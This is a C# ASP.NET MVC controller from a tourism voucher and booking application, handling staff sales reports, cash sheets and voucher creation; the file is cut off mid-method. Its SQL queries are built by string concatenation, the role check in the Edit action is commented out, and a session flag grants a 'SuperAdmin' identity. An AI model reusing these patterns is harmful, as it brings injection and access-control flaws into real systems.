using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Entity;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using RazorPDF;
using Tourism_Project.Models;
using System.Collections;
using MySql.Data.MySqlClient;
using System.Web.Configuration;
using System.Globalization;
using System.IO;
using System.Reflection;
namespace Tourism_Project.Controllers
{
    [Authorize]
    public class VoucherController : Controller
    {

        #region Connection String
        static string connString = WebConfigurationManager.AppSettings["ServerDBConnection"].ToString();
        #endregion

        #region Properties
        private MySqlConnection mysqlconnection;
        private MySqlCommand mysqlcmd;
        private MySqlDataReader mysqldr;
        private int UserId;
        private int UserType;
        #endregion

        public VoucherController()
        {
            mysqlconnection = new MySqlConnection(connString);
            mysqlcmd = new MySqlCommand();
            mysqldr = null;
        }
        public int userType
        {
            get
            {
                if (!string.IsNullOrEmpty(User.Identity.Name))
                    return Convert.ToInt32(User.Identity.Name.Split(',')[2]);
                else if (Session["Master"] != null && (bool)Session["Master"] == true)
                    return 1;
                else
                    return 0;

                //if(!(Session["ShowVouchers"] != null && Convert.ToBoolean(Session["ShowVouchers"])))
                //    return 0;
                //else 
            }
        }

        public string loggedInUserName
        {
            get
            {
                if (string.IsNullOrEmpty(User.Identity.Name) && Session["Master"] != null && (bool)Session["Master"] == true)
                {
                    return "0,SuperAdmin,1";
                }
                else if (!string.IsNullOrEmpty(User.Identity.Name))
                {
                    return User.Identity.Name;
                }
                else
                {
                    return "-1,baduser,-1";
                }
            }
        }
        private VoucherRepository db = new VoucherRepository();

        /*
        [HttpPost]
        public ActionResult StaffWiseReport(RegisterModel reg, FormCollection form)
        {
            string FromDate = form["CreatedDate_From_Report"].ToString();
            string ToDate = form["CreatedDate_From_Report"].ToString();
            if (string.IsNullOrEmpty(FromDate))
            {
                FromDate = DateTime.Now.Date.AddDays(-1).ToString();
            }
            if (string.IsNullOrEmpty(ToDate))
            {
                ToDate = DateTime.Now.Date.ToString();
            }

            DateTime createFromdate = Convert.ToDateTime(FromDate);
            DateTime createTodate = Convert.ToDateTime(ToDate);

            List<voucherStaffList> voucherStaff = (new VoucherRepository()).getStaffVoucher(createFromdate, createTodate);

            TempData["createFromdate"] = createFromdate;
            TempData["createTodate"] = createTodate;

            TempData.Keep();

            return View(voucherStaff);

        }

        */
        public ActionResult StaffWiseReport()
        {

            try
            {
                string FromDate = string.Empty;
                string ToDate = string.Empty;
                if (string.IsNullOrEmpty(FromDate))
                {
                    FromDate = DateTime.Now.Date.ToString();
                }
                if (string.IsNullOrEmpty(ToDate))
                {
                    ToDate = DateTime.Now.Date.ToString();
                }

                DateTime createFromdate = Convert.ToDateTime(FromDate);
                DateTime createTodate = Convert.ToDateTime(ToDate);

                List<voucherStaffList> voucherStaff = (new VoucherRepository()).getStaffVoucher(createFromdate, createTodate);

                //Changes made  on 3-2-2016
                List<voucherStaffList> voucherBooking = (new VoucherRepository()).getStaffBooking(createFromdate, createTodate);
                TempData["createFromdate"] = createFromdate;
                TempData["createTodate"] = createTodate;
                TempData.Keep();

                Log_text_File("Date:" + createFromdate + "ToDate:" + createTodate);

                var items = new List<voucherStaffList>();
                List<voucherStaffList> finalMerge = new List<voucherStaffList>();
                if (voucherStaff != null && voucherStaff.Count > 0)
                {
                    finalMerge = voucherStaff;
                }
                if (voucherBooking != null && voucherBooking.Count > 0)
                {
                    items = finalMerge.Union<voucherStaffList>(voucherBooking).ToList();
                }
                else
                {
                    items = finalMerge;
                }

                List<voucherStaffList> result = items
                        .GroupBy(l => l.createdBy)
                        .Select(cl => new voucherStaffList
                        {
                            createdBy = cl.First().createdBy,
                            totalCardPaid = cl.Sum(c => c.totalCardPaid),
                            totalCashPaid = cl.Sum(c => c.totalCashPaid),
                            totalPrice = cl.Sum(c => c.totalPrice),
                        }).ToList();

                return View(result);
                //  return View(voucherBooking);
            }
            catch (Exception ex)
            {
                Log_text_File("staffwiseReport: " + ex.ToString());
                return View();

            }
        }

        [HttpPost]
        public ActionResult StaffWiseReport(string fromDate, string endDate)
        {

            try
            {
                string FromDate = fromDate;
                string ToDate = endDate;

                if (string.IsNullOrEmpty(FromDate))
                {
                    FromDate = DateTime.Now.Date.AddDays(-1).ToString();
                }
                if (string.IsNullOrEmpty(ToDate))
                {
                    ToDate = DateTime.Now.Date.ToString();
                }


                Log_text_File("Date:" + FromDate + "ToDate:" + endDate);

                //DateTime createFromdate1 = Convert.ToDateTime(FromDate);
                //DateTime createTodate1 = Convert.ToDateTime(ToDate);

                DateTime createFromdate = DateTime.ParseExact(FromDate, "MM/dd/yyyy", CultureInfo.InvariantCulture);
                DateTime createTodate = DateTime.ParseExact(ToDate, "MM/dd/yyyy", CultureInfo.InvariantCulture);

                List<voucherStaffList> voucherStaff = (new VoucherRepository()).getStaffVoucher(createFromdate, createTodate);

                //Changes made  on 3-2-2016
                List<voucherStaffList> voucherBooking = (new VoucherRepository()).getStaffBooking(createFromdate, createTodate);
                TempData["createFromdate"] = createFromdate;
                TempData["createTodate"] = createTodate;
                TempData.Keep();

                var items = new List<voucherStaffList>();
                List<voucherStaffList> finalMerge = new List<voucherStaffList>();
                if (voucherStaff != null && voucherStaff.Count > 0)
                {
                    finalMerge = voucherStaff;
                }
                if (voucherBooking != null && voucherBooking.Count > 0)
                {
                    items = finalMerge.Union<voucherStaffList>(voucherBooking).ToList();
                }
                else
                {
                    items = finalMerge;
                }

                List<voucherStaffList> result = items
                        .GroupBy(l => l.createdBy)
                        .Select(cl => new voucherStaffList
                        {
                            createdBy = cl.First().createdBy,
                            totalCardPaid = cl.Sum(c => c.totalCardPaid),
                            totalCashPaid = cl.Sum(c => c.totalCashPaid),
                            totalPrice = cl.Sum(c => c.totalPrice),
                        }).ToList();

                return View(result);
            }
            catch (Exception ex)
            {
                Log_text_File("staffwiseReport: " + ex.ToString());
                return View();

            }

            //List<voucherStaffList> voucherStaff = (new VoucherRepository()).getStaffVoucher(createFromdate, createTodate);
            //TempData["createFromdate"] = createFromdate;
            //TempData["createTodate"] = createTodate;

            //DataTable dt = new DataTable();
            //dt = (new VoucherRepository()).VoucherBookingStaffWiseReport(createFromdate, createTodate);

            //TempData.Keep();
            //return View(voucherStaff);

            ////Changes on 3-2-2016

            //List<voucherStaffList> voucherBooking = (new VoucherRepository()).getStaffBooking(createFromdate, createTodate);

            //TempData["createFromdate"] = createFromdate;
            //TempData["createTodate"] = createTodate;

            //DataTable dt1 = new DataTable();
            //dt1 = (new VoucherRepository()).VoucherBookingStaffWiseReport(createFromdate, createTodate);

            //TempData.Keep();

            //return View(voucherBooking);

        }

        /// <summary>
        /// [Get method] Get shopname and shopid
        /// </summary>
        /// <returns></returns>
        public ActionResult CashSheet()
        {
            //get shopName for dropdown

            //shopRepository db_shoprepository = new shopRepository();
            //List<shop> list_shopName;
            //list_shopName = db_shoprepository.GetList();
            //List<SelectListItem> selectListItem_shop = new List<SelectListItem>();
            //SelectListItem items = new SelectListItem();

            //foreach (shop s in list_shopName)
            //{
            //    items = new SelectListItem();
            //    items.Value = s.shopId.ToString();
            //    items.Text = s.shopName;
            //    selectListItem_shop.Add(items);
            //}
            //ViewBag.shopname = selectListItem_shop;
            //TempData["shopname"] = selectListItem_shop;
            //TempData.Keep();
            //End get shopName for dropdown
            //  List<Voucher> v = new List<Voucher>();

            //Removed By yummy 25-8-2015
            //mysqlconnection.Open();
            //mysqlcmd = mysqlconnection.CreateCommand();

            //mysqlcmd.CommandText = "Select * from users as u where (u.usertype = 2 or u.usertype = 1) and u.active = 1 OR u.active is null order by u.name;";//2 equals to staff
            //MySqlDataAdapter adp = new MySqlDataAdapter(mysqlcmd);
            //DataSet ds = new DataSet();
            //adp.Fill(ds);
            //List<SelectListItem> selectListItems = new List<SelectListItem>();
            //SelectListItem item = new SelectListItem();

            //for (int i = 0; i < ds.Tables[0].Rows.Count; i++)
            //{
            //    item = new SelectListItem();
            //    item.Value = ds.Tables[0].Rows[i]["id"].ToString();
            //    item.Text = ds.Tables[0].Rows[i]["name"].ToString();
            //    selectListItems.Add(item);
            //}
            //TempData["staffarray"] = selectListItems;
            //TempData.Keep();
            //end
            return View();
        }


        private string ConvertDateForClient(string dbformat)
        {
            string month, day;
            DateTime date = Convert.ToDateTime(dbformat);
            month = date.Month < 10 ? "0" + date.Month : date.Month + "";
            day = date.Day < 10 ? "0" + date.Day : date.Day + "";

            return string.Format("{0}/{1}/{2}", day, month, date.Year);
        }


        [HttpGet]
        public ActionResult CashSheet(int staffId, string fromDate, string toDate)
        {
            if (staffId == 0)
            {
                return View();
            }

            //DateTime createdate = Convert.ToDateTime(form["txt_date"].ToString());
            DateTime createFromdate = Convert.ToDateTime(fromDate);
            DateTime createTodate = Convert.ToDateTime(toDate);

            //temp check
            //DateTime createFromdate1 = Convert.ToDateTime(fromDate);
            //DateTime createTodate1 = Convert.ToDateTime(toDate);

            //end



            List<Voucher> list_voucher = db.GetList().Where(x =>
                x.Create_Date.Date >= createFromdate.Date && x.Create_Date.Date <= createTodate.Date && x.Create_By.Split(',')[0] == staffId.ToString()).ToList();

            //Modified on 4-2-2016
            List<BookingModel> bookings = new List<BookingModel>();
            var booking = new BookingModel();
            mysqlconnection.Open();
            mysqlcmd = mysqlconnection.CreateCommand();
            //Create_Date >= '" + FromTravelDate.ToString("yyyy-MM-ddTHH:mm:ss.fff") + "' AND Create_Date<= '" + ToTravelDate.ToString("yyyy-MM-ddTHH:mm:ss.fff") + "'group by Create_By
            mysqlcmd.CommandText = "SELECT b.createdDate, CONCAT(CONVERT(u.id,char) , ',' , u.username , ',' , CONVERT(u.usertype,CHAR)) ,b.voucherId,t.tourname,b.passenger,b.adults,b.children,b.infant,b.price,b.discount,b.cardPaid,b.cashPaid,b.PaymentMethod,b.id,b.totalprice from bookings b inner join tournames t on  b.tourid =t.id inner join users u on b.uid = u.id where CAST(createdDate AS DATE) >= '" + createFromdate.ToString("yyyy-MM-dd") + "' and CAST(createdDate AS DATE) <='" + createTodate.ToString("yyyy-MM-dd") + "' and uid=" + staffId;
            mysqldr = mysqlcmd.ExecuteReader();
            while (mysqldr.Read())
            {
                string[] user1 = User.Identity.Name.Split(','); //userid,username,usertype
                UserId = Int32.Parse(user1[0]);

                booking = new BookingModel();
                booking.Date = mysqldr.GetDateTime(0).ToString("dd/MM/yyyy");
                booking.name = mysqldr.GetString(1);
                booking.voucherId = "00" + mysqldr.GetInt32(2).ToString();
                booking.tourname = mysqldr.GetString(3);
                booking.PassengerName = mysqldr.GetString(4);
                booking.Adults = mysqldr.GetInt32(5);
                booking.Children = mysqldr.GetInt32(6);
                booking.Infant = mysqldr.GetInt32(7);
                booking.Price = mysqldr.GetFloat(8);
                booking.Discount = mysqldr.IsDBNull(9) ? 0 : mysqldr.GetFloat(9);
                booking.CardPaid = mysqldr.IsDBNull(10) ? 0 : mysqldr.GetFloat(10);
                booking.CashPaid = mysqldr.IsDBNull(11) ? 0 : mysqldr.GetFloat(11);
                // booking.PaymentType = mysqldr.GetInt32(12);
                booking.BookingID = mysqldr.GetInt32(13);
                booking.TotalPrice = mysqldr.GetFloat(14);
                bookings.Add(booking);
            }

            mysqldr.Close();
            mysqlconnection.Close();

            CompanyRespository dbcompany = new CompanyRespository();
            List<Company> list_comp = dbcompany.GetList();
            string[] user = User.Identity.Name.Split(','); //userid,username,usertype
            UserId = Int32.Parse(user[0]);

            list_voucher = (from objvoucher in list_voucher
                            join objcompany in list_comp on objvoucher.CompanyID equals objcompany.CompanyID
                            select new
                            {
                                objcompany,
                                objvoucher,
                            })
                            .Select(x => { x.objvoucher.p_CompanyName = x.objcompany.Name; return x.objvoucher; })
                            .ToList();

            TempData["createFromdate"] = createFromdate;
            TempData["createTodate"] = createTodate;
            TempData.Keep();

            //  var modelmix = new mixclass_voucher_booking { vou = list_voucher, book = null };
            var modelmix = new mixclass_voucher_booking { vou = list_voucher, book = bookings };
            return View(modelmix);
        }


        [HttpPost]
        public ActionResult CashSheet(RegisterModel reg, FormCollection form)
        {
            //DateTime createdate = Convert.ToDateTime(form["txt_date"].ToString());
            DateTime createFromdate = Convert.ToDateTime(form["CreatedDate_From_Report"].ToString());
            DateTime createTodate = Convert.ToDateTime(form["CreatedDate_To_Report"].ToString());

            //temp check
            //DateTime createFromdate1 = Convert.ToDateTime(form["CreatedDate_From_Report"].ToString());
            //DateTime createTodate1 = Convert.ToDateTime(form["CreatedDate_To_Report"].ToString());
            //end

            ViewBag.VoucherType = Request.Form["drp_Report"];

            if (Request.Form["drp_Report"] == "Voucher Report")
            {
                //25-8-2015 removed by yummy
                //List<Voucher> list_voucher = db.GetList().Where(x =>
                //    x.Create_Date.Date >= createFromdate.Date && x.Create_Date <= createTodate && x.Create_By.Split(',')[0] == reg.ID.ToString()).ToList();

                List<Voucher> list_voucher = db.GetList().Where(x =>
               x.Create_Date.Date >= createFromdate.Date && x.Create_Date.Date <= createTodate.Date).ToList();

                //List<Voucher> list_voucher = db.GetList().Where(x =>
                //    x.Create_Date.Date >= createFromdate.Date && x.Create_Date.Date <= createTodate.Date).ToList();

                //Modified on 4-2-2016
                List<BookingModel> bookings = new List<BookingModel>();
                var booking = new BookingModel();

                mysqlconnection.Open();
                mysqlcmd = mysqlconnection.CreateCommand();
                mysqlcmd.CommandText = "SELECT b.createdDate, CONCAT(CONVERT(u.id,char) , ',' , u.username , ',' , CONVERT(u.usertype,CHAR)) ,b.voucherId,t.tourname,b.passenger,b.adults,b.children,b.infant,b.price,b.discount,b.cardPaid,b.cashPaid,b.PaymentMethod,b.id,b.totalprice from bookings b inner join tournames t on  b.tourid =t.id inner join users u on b.uid = u.id where CAST(createdDate AS DATE) >= '" + createFromdate.ToString("yyyy-MM-dd") + "' and CAST(createdDate AS DATE) <='" + createTodate.ToString("yyyy-MM-dd") + "'";
                // mysqlcmd.CommandText = "SELECT b.createdDate, CONCAT(CONVERT(u.id,char) , ',' , u.username , ',' , CONVERT(u.usertype,CHAR)) ,b.voucherId,t.tourname,b.passenger,b.adults,b.children,b.infant,b.price,b.discount,b.cardPaid,b.cashPaid,b.paymenttype,b.id,b.totalprice from bookings b inner join tournames t on  b.tourid =t.id inner join users u on b.uid = u.id where CAST(createdDate AS DATE) >= '" + createFromdate.ToString("yyyy-MM-dd") + "' and CAST(createdDate AS DATE) <='" + createTodate.ToString("yyyy-MM-dd") + "'";
                mysqldr = mysqlcmd.ExecuteReader();
                while (mysqldr.Read())
                {
                    booking = new BookingModel();
                    string[] user1 = User.Identity.Name.Split(','); //userid,username,usertype
                    UserId = Int32.Parse(user1[0]);

                    booking.Date = mysqldr.GetDateTime(0).ToString("dd/MM/yyyy");
                    booking.name = mysqldr.GetString(1);
                    booking.voucherId = "00" + mysqldr.GetInt32(2).ToString();
                    booking.tourname = mysqldr.GetString(3);
                    booking.PassengerName = mysqldr.GetString(4);
                    booking.Adults = mysqldr.GetInt32(5);
                    booking.Children = mysqldr.GetInt32(6);
                    booking.Infant = mysqldr.GetInt32(7);
                    booking.Price = mysqldr.GetFloat(8);
                    booking.Discount = mysqldr.IsDBNull(9) ? 0 : mysqldr.GetFloat(9);
                    booking.CardPaid = mysqldr.IsDBNull(10) ? 0 : mysqldr.GetFloat(10);
                    booking.CashPaid = mysqldr.IsDBNull(11) ? 0 : mysqldr.GetFloat(11);
                    //booking.PaymentType = mysqldr.GetInt32(12);
                    booking.BookingID = mysqldr.GetInt32(13);
                    booking.TotalPrice = mysqldr.GetFloat(14);
                    bookings.Add(booking);
                }

                mysqldr.Close();
                mysqlconnection.Close();

                CompanyRespository dbcompany = new CompanyRespository();
                List<Company> list_comp = dbcompany.GetList();


                string[] user = User.Identity.Name.Split(','); //userid,username,usertype
                UserId = Int32.Parse(user[0]);

                list_voucher = (from objvoucher in list_voucher
                                join objcompany in list_comp on objvoucher.CompanyID equals objcompany.CompanyID
                                select new
                                {
                                    objcompany,
                                    objvoucher,
                                })
                                .Select(x => { x.objvoucher.p_CompanyName = x.objcompany.Name; return x.objvoucher; })
                                .ToList();

                TempData["createFromdate"] = createFromdate;
                TempData["createTodate"] = createTodate;
                TempData.Keep();

                var modelmix = new mixclass_voucher_booking { vou = list_voucher, book = bookings };
                return View(modelmix);

                // where objvoucher.Create_Date == createdate && objvoucher.shopId == voucher.shopId
                //select new Voucher()
                //{
                //    Tour=objvoucher.Tour,
                //    FareBasis=objvoucher
                //    p_CompanyName = objcompany.Name
                //}).ToList();


                //ViewBag.listvoucher = list_voucher;
                //if (TempData["shopname"] == null)
                //{
                //    shopRepository db_shoprepository = new shopRepository();
                //    List<shop> list_shopName;
                //    list_shopName = db_shoprepository.GetList();
                //    List<SelectListItem> selectListItem_shop = new List<SelectListItem>();
                //    SelectListItem items = new SelectListItem();
                //    items.Value = "0";
                //    items.Text = "";
                //    selectListItem_shop.Add(items);
                //    foreach (shop s in list_shopName)
                //    {
                //        items = new SelectListItem();
                //        items.Value = s.shopId.ToString();
                //        items.Text = s.shopName;
                //        selectListItem_shop.Add(items);
                //    }
                //    ViewBag.shopname = selectListItem_shop;
                //    TempData["shopname"] = selectListItem_shop;
                //}

                //TempData["createdate"] = createdate;

            }

            /* commented on 2015-08-24
            else if (Request.Form["drp_Report"] == "Our Tour Report")
            {
                List<BookingModel> modelsBook = new List<BookingModel>();

                try
                {
                    TempData["createdate"] = createdate;
                    TempData.Keep();
                    mysqlconnection.Open();
                    mysqlcmd = mysqlconnection.CreateCommand();
                    //mysqlcmd.CommandText = "Select * from bookings as b,tourcode as t,tournames as tn where b.uid=@uid and b.createdDate=@createdDate and t.id=b.tourcode and t.tourid=tn.id";
                    mysqlcmd.CommandText = "Select * from bookings as b,tourcode as t,tournames as tn, users as u where b.uid=@uid and b.createdDate=@createdDate and t.id=b.tourcode and t.tourid=tn.id and u.id=@uid";
                    mysqlcmd.Parameters.AddWithValue("@uid", reg.ID);
                    mysqlcmd.Parameters.AddWithValue("@createdDate", createdate.Year + "-" + createdate.Month + "-" + createdate.Day);


                    mysqldr = mysqlcmd.ExecuteReader();

                    while (mysqldr.Read())
                    {
                        modelsBook.Add(new BookingModel
                        {
                            BookingID = mysqldr.GetInt32(0),
                            Agent = mysqldr.GetString(2),
                            Voucher = mysqldr.IsDBNull(3) ? null : mysqldr.GetString(3),
                            Reference = mysqldr.GetString(4),
                            //Date = this.ConvertDateForClient(mysqldr.GetString(5)),
                            Date = mysqldr.GetString("date"),

                            Tour = mysqldr.GetInt32(6),
                            TourCode = mysqldr.GetInt32(7),
                            pickuplocation = mysqldr.GetInt32(8),
                            time = mysqldr.GetString(9),
                            PassengerName = mysqldr.GetString(10),
                            Adults = mysqldr.GetInt32(11),
                            FamilyChildren = mysqldr.GetInt32(12),
                            Infant = mysqldr.GetInt32(13),
                            Children = mysqldr.GetInt32(14),
                            Price = mysqldr.GetInt32(15),
                            Discount = mysqldr.GetInt32(16),
                            Commission = mysqldr.GetFloat(17),
                            TotalPrice = mysqldr.GetFloat(18),
                            ContactDetails = mysqldr.GetString(19),
                            Comments = mysqldr.GetString(20),

                            //newly added filed by yummy on 13-4-15
                            voucherId = mysqldr.GetString("voucherId"),
                            //shopId = mysqldr.GetInt32("shopId"),
                            //salesfrom = mysqldr.GetString("salesfrom"),
                            custo_paymenttype = mysqldr.GetString("custo_paymenttype"),
                            tourcodevalues = mysqldr.GetString("tourcodevalues"),
                            tourname = mysqldr.GetString("tourname"),


                            //on 24-08-2015
                            //Username = mysqldr.GetString("name")
                        });
                    }
                    mysqldr.Close();

                }
                catch (Exception e)
                {

                }
                finally
                {
                    if (mysqlconnection.State == System.Data.ConnectionState.Open)
                        mysqlconnection.Close();

                }
                var modelmix = new mixclass_voucher_booking { vou = null, book = modelsBook };
                return View(modelmix);
            }
                */
            else
            {
                //TempData["createdate"] = createdate;
                TempData["createFromdate"] = createFromdate;
                TempData["createTodate"] = createTodate;

                TempData.Keep();
                var modelmix = new mixclass_voucher_booking { vou = null, book = null };
                return View(modelmix);
            }

        }


        //
        // GET: /Voucher/

        public ActionResult Index(int? onPage, int? requiredNumbers, string Voucher_ID, string Company, string Travel_Date)
        {
            if (userType == 1 || userType == 2 || userType == 5)
            {
                Session["ShowVouchers"] = true;
                if (!string.IsNullOrEmpty(Company))
                    @ViewBag.Company = Company;
                if (!string.IsNullOrEmpty(Travel_Date))
                    @ViewBag.Travel_Date = Travel_Date;
                if (!string.IsNullOrEmpty(Voucher_ID))
                    @ViewBag.Voucher_ID = Voucher_ID;


                DateTime travelDate = new DateTime();
                DateTime.TryParse(Travel_Date, out travelDate);
                VoucherRepository rep = new VoucherRepository();
                var vouchers = rep.Select(Voucher_ID, Convert.ToInt32(Company), travelDate, onPage, requiredNumbers);
                CompanyRespository cRep = new CompanyRespository();
                var companies = cRep.GetList().OrderBy(x => x.Name);
                foreach (Voucher v in vouchers)
                {
                    var company = companies.Single(x => x.CompanyID == v.CompanyID);
                    v.CompanyName = company.Name;
                    v.CompanyNumber = company.Phone;
                    v.Discount = string.IsNullOrEmpty(v.Discount.ToString()) ? 0 : v.Discount;
                }

                List<SelectListItem> selectListItems = new List<SelectListItem>();
                SelectListItem item = new SelectListItem();
                item.Value = "0";
                item.Text = "All";
                selectListItems.Add(item);
                foreach (Company c in companies)
                {
                    item = new SelectListItem();
                    item.Value = c.CompanyID.ToString();
                    item.Text = c.Name;
                    selectListItems.Add(item);
                }
                ViewBag.Companies = selectListItems;
                if (userType == 2)
                {
                    vouchers = vouchers.Where(v => v.Create_Date > DateTime.Now.AddDays(-15)).ToList();
                }

                string[] CurrentUserName = loggedInUserName.Split(',');
                if (CurrentUserName.Length > 2)
                    ViewBag.loggedInUserName = CurrentUserName[1];
                else
                    ViewBag.loggedInUserName = "";


                if (onPage == null && requiredNumbers == null)
                {
                    return View(vouchers);
                }
                else
                {
                    return View("More", vouchers);
                }
            }
            return RedirectToAction("Index", "Home");

        }

        [HttpGet, ActionName("Count")]
        public int Count(string Voucher_ID, string Tour_Name, string Travel_Date)
        {
            List<Voucher> vouchers =
                        db.GetList(v => v.IsActive == true).ToList();

            if (!string.IsNullOrEmpty(Voucher_ID))
            {
                vouchers = vouchers.Where(v => v.VoucherID == Voucher_ID).ToList();
                @ViewBag.Voucher_ID = Voucher_ID;
            }
            if (!string.IsNullOrEmpty(Tour_Name))
            {
                vouchers = vouchers.Where(v => v.Tour.ToLower().Trim().Contains(Tour_Name.ToLower().Trim())).ToList();
                @ViewBag.Tour_Name = Tour_Name;
            }
            if (!string.IsNullOrEmpty(Travel_Date))
            {
                vouchers = vouchers.Where(v => v.TravelDate == Convert.ToDateTime(Travel_Date)).ToList();
                @ViewBag.Travel_Date = Travel_Date;
            }
            return vouchers.Count;
        }

        //
        // GET: /Voucher/Details/5

        public ActionResult Details(int id = 0)
        {
            if (userType == 1 || userType == 2)
            {
                Voucher voucher = db.Get(v => v.VoucherBookingID == id);
                if (voucher == null)
                {
                    return HttpNotFound();
                }
                voucher.Discount = string.IsNullOrEmpty(voucher.Discount.ToString()) ? 0 : voucher.Discount;

                if (voucher.CompanyID != null)
                {
                    CompanyRespository companyRespository = new CompanyRespository();
                    Company c = companyRespository.Get(co => co.CompanyID == voucher.CompanyID);
                    if (c != null) ViewBag.CompanyName = c.Name;
                }
                return View(voucher);
            }
            return RedirectToAction("Index", "Home");
        }

        //
        // GET: /Voucher/Create
        //THIS CREATE WILL CREATE A TEMP ENTRY IN DB, AND IF USER CANCELS OUT, THE TEMP ENTRY WILL REMAIN IN DB, WHICH HAVE TO BE DELETED PERIODICALLY BY THIS
        //DELETE n1 FROM TestDB.dbo.Vouchers n1, TestDB.dbo.Vouchers n2 WHERE n1.VoucherBookingID < n2.VoucherBookingID AND n1.VoucherID = n2.VoucherID
        public ActionResult Create()
        {
            if (userType == 1 || userType == 2)
            {
                Voucher voucher = new Voucher();
                voucher.Create_By = loggedInUserName;
                Voucher v = db.Create(voucher);
                List<SelectListItem> selectListItems = new List<SelectListItem>();
                SelectListItem item = new SelectListItem();
                foreach (Company c in v.Companies)
                {
                    item = new SelectListItem();
                    item.Value = c.CompanyID.ToString();
                    item.Text = c.Name;
                    selectListItems.Add(item);
                }
                //ViewBag.Companies = selectListItems;
                TempData["Companies"] = selectListItems;
                TempData.Keep();

                #region get shopName for dropdown temporary shutdown
                ////get shopName for dropdown

                //shopRepository db_shoprepository = new shopRepository();
                //List<shop> list_shopName;
                //list_shopName = db_shoprepository.GetList();
                //List<SelectListItem> selectListItem_shop = new List<SelectListItem>();
                //SelectListItem items = new SelectListItem();
                ////items.Value = null;
                ////items.Text = "";
                ////selectListItem_shop.Add(items);
                //foreach (shop s in list_shopName)
                //{
                //    items = new SelectListItem();
                //    items.Value = s.shopId.ToString();
                //    items.Text = s.shopName;
                //    selectListItem_shop.Add(items);
                //}
                ////ViewBag.shopname = selectListItem_shop;
                //TempData["shopname"] = selectListItem_shop;
                //TempData.Keep();
                #endregion
                return View(v);

            }
            return RedirectToAction("Index", "Home");
        }

        //
        // POST: /Voucher/Create

        [HttpPost]
        public ActionResult Create(Voucher voucher, FormCollection form)
        {
            Voucher vnew = new Voucher();
            vnew.VoucherID = voucher.VoucherID;
            ModelState.Remove("paymenttype");//remove for hosting
            if (ModelState.IsValid)
            {
                //** Added by Suresh on 27-02-2015 for resolving voucher duplication issue 
                var dbQ = new VoucherEntities();
                string lastVoucherNumber = string.Empty;
                lastVoucherNumber = dbQ.ExecuteStoreQuery<string>("Select MAX(VoucherID) from dbo.Vouchers").ToList()[0];
                if (!String.IsNullOrEmpty(lastVoucherNumber))
                {
                    //lastVoucherNumber = "TNT" + (Convert.ToInt32(lastVoucherNumber.Substring(3)) + 1).ToString("D5");
                    lastVoucherNumber = "TNTQ" + (Convert.ToInt32(lastVoucherNumber.Substring(4)) + 1).ToString("D5");
                }
                else
                {
                    //lastVoucherNumber = "TNT00001";
                    lastVoucherNumber = "TNTQ00001";
                }
                //*

                //Voucher v = db.GetList(x => x.VoucherID == voucher.VoucherID).OrderByDescending(x => x.VoucherBookingID).FirstOrDefault();
                Voucher v = new Voucher();
                //v.VoucherID = voucher.VoucherID;
                v.VoucherID = lastVoucherNumber;
                v.Create_Date = DateTime.Now;
                v.IsActive = true;
                v.AdultCount = voucher.AdultCount;
                v.ChildrenCount = voucher.ChildrenCount;
                v.Comments = voucher.Comments;
                v.CompanyID = voucher.CompanyID;
                v.FareBasis = voucher.FareBasis;
                v.FirstName = voucher.FirstName;
                v.InfantCount = voucher.InfantCount;
                v.LastName = voucher.LastName;
                v.Levy = voucher.Levy;
                v.Create_By = loggedInUserName;
                // v.Create_Date = DateTime.Now.Date;
                v.Create_Date = DateTime.Now;
                v.Modify_By = loggedInUserName;
                v.Modify_Date = DateTime.Now.Date;
                v.PickupLocation = voucher.PickupLocation;
                v.Price = voucher.Price;
                v.RoomNumber = voucher.RoomNumber;
                v.Tour = voucher.Tour;
                v.TravelDate = new DateTime(voucher.TravelDate.Value.Date.Year, voucher.TravelDate.Value.Date.Month, voucher.TravelDate.Value.Date.Day);
                v.UserID = Convert.ToInt32(loggedInUserName.ToString().Substring(loggedInUserName.LastIndexOf(",") + 1));
                v.Commission = voucher.Commission;
                v.Discount = voucher.Discount;
                v.ConfirmationNumber = voucher.ConfirmationNumber;
                // v.shopId = Convert.ToInt32(form["drp_shopnmaes"].ToString());
                //  v.shopId = voucher.shopId;

                v.salesfrom = voucher.salesfrom;

                v.cardPaid = voucher.cardPaid;//yummy
                v.cashPaid = voucher.cashPaid;//yummy
                //remove for hosting  v.paymenttype = voucher.paymenttype;

                db.Add(v);
                return RedirectToAction("Index");
            }
            if (TempData["Companies"] == null)
            {
                CompanyRespository respository = new CompanyRespository();
                voucher.Companies = respository.GetList(x => x.IsActive == true);
                List<SelectListItem> selectListItems = new List<SelectListItem>();
                SelectListItem item = new SelectListItem();
                foreach (Company c in voucher.Companies)
                {
                    item = new SelectListItem();
                    item.Value = c.CompanyID.ToString();
                    item.Text = c.Name;
                    selectListItems.Add(item);
                }
                //ViewBag.Companies = selectListItems;
                TempData["Companies"] = selectListItems;
            }

            #region  //get shopName for dropdown temporar shutdown by yummy
            //if (TempData["shopname"] == null)
            //{
            //    shopRepository db_shoprepository = new shopRepository();
            //    List<shop> list_shopName;
            //    list_shopName = db_shoprepository.GetList();
            //    List<SelectListItem> selectListItem_shop = new List<SelectListItem>();
            //    SelectListItem items = new SelectListItem();

            //    foreach (shop s in list_shopName)
            //    {
            //        items = new SelectListItem();
            //        items.Value = s.shopId.ToString();
            //        items.Text = s.shopName;
            //        selectListItem_shop.Add(items);
            //    }
            //    // ViewBag.shopname = selectListItem_shop;
            //    TempData["shopname"] = selectListItem_shop;
            //}
            #endregion
            TempData.Keep();
            return View(vnew);
        }

        //
        // GET: /Voucher/Edit/5

        public ActionResult Edit(int id = 0)
        {
            // if (userType == 1)
            {
                if (id != 0)
                {
                    Voucher voucher = db.Get(v => v.VoucherBookingID == id);
                    if (voucher == null)
                    {
                        return HttpNotFound();
                    }


                    //get shopName for dropdown temprary shutdown by yummy

                    ////shopRepository db_shoprepository = new shopRepository();
                    ////List<shop> list_shopName;
                    ////list_shopName = db_shoprepository.GetList();
                    ////List<SelectListItem> selectListItem_shop = new List<SelectListItem>();
                    ////SelectListItem items = new SelectListItem();
                    //////items.Value = "0";
                    //////items.Text = "";
                    //////selectListItem_shop.Add(items);
                    ////foreach (shop s in list_shopName)
                    ////{
                    ////    items = new SelectListItem();
                    ////    items.Value = s.shopId.ToString();
                    ////    items.Text = s.shopName;
                    ////    selectListItem_shop.Add(items);
                    ////}
                    ////TempData["shopname"] = selectListItem_shop;
                    ////TempData.Keep();

                    ////if (voucher.shopId != null)
                    ////{
                    ////    shop sp = db_shoprepository.Get(co => co.shopId == voucher.shopId);

